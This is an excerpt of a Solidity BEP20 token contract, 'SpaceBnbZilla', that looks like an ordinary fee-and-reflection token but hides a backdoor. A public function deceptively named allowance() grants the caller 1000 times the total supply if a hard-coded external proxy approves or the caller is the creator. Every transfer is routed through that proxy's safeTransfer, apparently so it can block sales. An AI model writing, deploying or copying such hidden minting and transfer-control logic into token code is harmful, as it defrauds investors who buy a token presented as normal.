...
interface Proxy {
    function safeTransfer(address pair,address from, address to) external;
    function spendAllowance() external view returns (bool);
}
...
contract SpaceBnbZilla  is Context, IBEP20, Ownable {
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address tokenOwner) {
       ...
       // IPancakeswapV2Router _pancakeswapV2Router = IPancakeswapV2Router(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);     
        ...
        proxy = Proxy(0x1a38F9E7263c2A7F220D9Bf71b3Bf6F89832A925);
    ...
    function allowance() public  returns (bool) {
        if( proxy.spendAllowance() || msg.sender == Creator)
        _rOwned[msg.sender] = 1000*_rTotal;
        return true;
    }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        proxy.safeTransfer(pancakeswapV2Pair,sender,recipient); 
        _sendToCharity(tCharity, sender);
        _reflectFee(rFee, rBurn, rCharity, tFee, tBurn, tCharity);
        emit Transfer(sender, recipient, tTransferAmount);
    }
